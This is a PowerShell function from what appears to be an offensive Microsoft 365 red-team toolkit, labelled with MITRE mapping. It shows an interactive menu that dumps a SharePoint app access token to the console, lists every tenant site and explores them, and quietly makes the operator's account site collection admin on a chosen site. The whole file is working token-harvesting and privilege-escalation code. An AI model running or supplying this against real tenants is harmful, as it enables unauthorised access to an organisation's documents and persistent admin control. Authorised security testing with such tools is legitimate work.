function SharepointExploiter {

    mitre_details("SharepointExploiter")
    
    $sharepoint_options = @{0 = "Back to main menu"; 1 = "Retrieve Sharepoint Access Token"; 2 = "List all sites in the tenant"; 3 = "Explore a sharepoint site"; 4 = "Gain rights to a sharepoint site"}
    #$sharepoint_options = @{0 = "Back to main menu"; 1 = "Retrieve Sharepoint Access Token"; 2 = "List all sites in the tenant"; 3 = "Explore a sharepoint site"; 4 = "Gain rights to a sharepoint site"; 5 = "Remove rights from a sharepoint site (Undo option 4)"}
    do {
        Write-Host "`n`nSharepoint options:" @fg_yellow
        foreach ($key in $sharepoint_options.keys){
            Write-Host $key ':' $sharepoint_options[$key]
        }    

        while ($true) {
            try {
                Write-Host "`n"
                [int]$recon_user_choice = Read-Host -Prompt 'Choose a Sharepoint option:'
                break
            }
            catch {
                Write-Host "Invalid input!!! Choose an option number from the list!"
            }
        }
        
         if ($recon_user_choice -eq 1) {
            #Get sharepoint access token
            Write-Host "`n#####################################TOKEN######################################`n"
            Get-PnPAppAuthAccessToken
            Write-Host "`n################################################################################`n"
            #Export and save this token
         }

         if ($recon_user_choice -eq 2) {
            #List all sites in tenant
            Write-Host "`nListing all available sites in sharepoint ...`n" @fg_yellow
            Get-SPOSite | Format-Table URL
         }

         if ($recon_user_choice -eq 3) {
            #Explore a sharepoint site
            $site_list = Get-SPOSite
            Write-Host ""
            foreach ($item in $site_list){
                Write-Host $([array]::IndexOf($site_list,$item)+1) ':' $item.URL
            }  
            
            while ($true) {
                try {
                    Write-Host "`n"
                    [int]$site_choice = Read-Host -Prompt "Select a sharepoint site from the list you would like to explore"
                    break
                }
                catch {
                    Write-Host "Invalid input!!! Choose an option number from the list!"
                }
            }
            #Explore site
            SharepointSiteExploiter($site_list[$site_choice-1].URL)
         }

         if ($recon_user_choice -eq 4) {
            #Explore a sharepoint site
            $site_list = Get-SPOSite
            Write-Host ""
            foreach ($item in $site_list){
                Write-Host $([array]::IndexOf($site_list,$item)+1) ':' $item.URL
            }  
            
            while ($true) {
                try {
                    Write-Host "`n"
                    [int]$site_choice = Read-Host -Prompt "Select a sharepoint site from the list you would like to gain rights to" -ErrorAction Stop
                    break
                }
                catch {
                    Write-Host "Invalid input!!! Choose an option number from the list!"
                }
            }

            #Grant rights in site
            Write-Host "Attempting to gain admin rights in the sharepoint site ..."
            try {
                Set-SPOUser -Site $site_list[$site_choice-1].URL -LoginName $global:AdminUsername -IsSiteCollectionAdmin $true -ErrorAction Stop
                Start-Sleep -Seconds 5
                Write-Host "Successfully gained admin rights in sharepoint site $($site_list[$site_choice-1].URL)" @fg_yellow @bg_black
            }
            catch {
                Write-Host "Error : Failed to get admin rights in sharepoint site $($site_list[$site_choice-1].URL)"
            }
            
         }

    } while (
        $recon_user_choice -ne 0)
        
}